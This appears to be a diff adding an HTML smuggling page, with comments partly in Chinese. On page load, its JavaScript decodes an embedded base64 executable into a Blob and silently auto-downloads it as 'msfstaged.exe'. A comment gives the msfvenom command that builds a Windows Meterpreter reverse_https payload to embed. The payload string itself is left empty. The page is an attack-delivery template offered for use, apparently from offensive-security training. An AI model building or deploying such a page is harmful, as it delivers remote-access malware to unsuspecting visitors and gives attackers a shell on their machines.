@@ -1,0 +1,39 @@
+<html>
+    <body>
+        <script>
+            function base64ToArrayBuffer(base64) {
+                var binary_string = window.atob(base64);
+                var len = binary_string.length;
+                var bytes = new Uint8Array(len);
+                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+                return bytes.buffer;
+            }
+
+			// sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= -f exe -o /var/www/html/msfstaged.exe
+			// base64 /var/www/html/msfstaged.exe
+			// 在嵌入 Base64 编码的可执行文件之前, 我们必须删除任何换行或新行, 将其嵌入为一个连续的字符串
+			// 或者, 我们可以将每行用引号括起来
+            var file = '';
+            var data = base64ToArrayBuffer(file);
+            var blob = new Blob([data], { type: 'octet/stream' });
+            var fileName = 'msfstaged.exe';
+
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+
+            // 判断是否为 Microsoft Edge
+            if (window.navigator && window.navigator.msSaveBlob) {
+                // 适用于 Microsoft Edge 的保存 Blob 方法
+                window.navigator.msSaveBlob(blob, fileName);
+            } else {
+                // 其他浏览器如 Google Chrome 的 Blob 下载方法
+                a.href = url;
+                a.download = fileName;
+                a.click();
+                window.URL.revokeObjectURL(url);
+            }
+        </script>
+    </body>
+</html>
